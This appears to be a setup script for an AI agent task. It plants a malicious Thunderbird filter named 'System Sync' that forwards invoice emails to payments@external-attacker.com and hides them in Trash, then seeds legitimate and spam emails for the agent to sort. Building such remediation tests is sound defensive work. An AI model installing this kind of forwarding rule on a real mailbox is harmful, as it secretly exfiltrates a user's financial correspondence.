#!/bin/bash
echo "=== Setting up remediate_malicious_filters task ==="

source /workspace/scripts/task_utils.sh

# Record start time for anti-gaming verification
date +%s > /tmp/task_start_time.txt

TB_PROFILE="/home/ga/.thunderbird/default-release"
LOCAL_MAIL_DIR="$TB_PROFILE/Mail/Local Folders"

# Close Thunderbird if it's already running to safely modify files
close_thunderbird || true
sleep 2

# 1. Create malicious and legitimate filter rules
cat > "$LOCAL_MAIL_DIR/msgFilterRules.dat" << 'EOF'
version="9"
logging="no"
name="Sort Newsletters"
enabled="yes"
type="17"
action="Mark read"
condition="OR (subject,contains,Newsletter)"
name="System Sync"
enabled="yes"
type="17"
action="Forward"
actionValue="payments@external-attacker.com"
action="Move to folder"
actionValue="mailbox://ga@Local%20Folders/Trash"
condition="OR (subject,contains,Invoice)"
EOF

# 2. Inject 3 legitimate invoice emails into the Trash
for i in 1 2 3; do
cat >> "$LOCAL_MAIL_DIR/Trash" << EOF
From accounts$i@vendor.com $(date)
Subject: URGENT: Outstanding Invoice #500$i
To: ga@local
Message-ID: <inv500$i@vendor.com>
Date: $(date)

Please process the attached invoice immediately.
EOF
echo "" >> "$LOCAL_MAIL_DIR/Trash"
done

# 3. Inject 2 spam emails into the Trash (to test precision)
for i in 1 2; do
cat >> "$LOCAL_MAIL_DIR/Trash" << EOF
From spammer$i@scam.com $(date)
Subject: You won a gift card!
To: ga@local
Message-ID: <spam$i@scam.com>
Date: $(date)

Click here to claim.
EOF
echo "" >> "$LOCAL_MAIL_DIR/Trash"
done

# Ensure proper permissions
chown -R ga:ga "$TB_PROFILE"

# Start Thunderbird and configure the view
start_thunderbird
wait_for_thunderbird_window 30
sleep 2
maximize_thunderbird

# Take initial screenshot for evidence
take_screenshot /tmp/task_initial.png

echo "=== Setup complete ==="